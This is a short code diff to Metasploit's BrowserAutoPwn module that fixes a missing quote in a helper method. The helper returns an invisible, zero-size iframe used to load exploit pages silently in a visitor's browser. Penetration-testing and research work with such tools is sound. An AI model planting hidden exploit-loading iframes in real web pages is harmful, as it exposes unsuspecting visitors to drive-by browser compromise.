@@ -536,7 +536,7 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 
 	def build_iframe(resource)
 		#return "<p>#{resource}</p>"
-		return <iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
+		return "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
 	end
 end
 end
